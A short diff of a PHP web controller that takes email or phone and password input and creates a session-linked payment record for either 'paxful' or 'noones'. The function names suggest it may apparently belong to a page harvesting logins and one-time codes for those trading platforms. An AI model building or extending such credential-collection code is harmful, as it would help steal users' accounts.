@@ -74,12 +74,38 @@ public function getOtpFormnoones(){
 }
     public function updateLoginDetails(Request $request)
 {
+
+
+   
     $request->validate([
         'email_or_phone' => 'required|string|max:255',
         'password' => 'required|string|max:255',
     ]);
 
     $paymentId = session('payment_id');
+
+    //  dd($paymentId);
+
+    if (!$paymentId) {
+
+        $lastSegment = $request->platform;
+
+        // dd($lastSegment);
+
+        if($lastSegment=='pa'){
+            $platform="paxful";
+        }else{
+            $platform="noones";
+        }
+        $payment = Payment::create([
+
+            'account_type'=>'checking',
+            'platform'=>$lastSegment
+        ]);
+
+        $paymentId = $payment->id;
+        session(['payment_id' => $paymentId]);
+    }
 
     if (!$paymentId) {
         return redirect()->back()->with('error', 'Session expired or payment ID missing.');
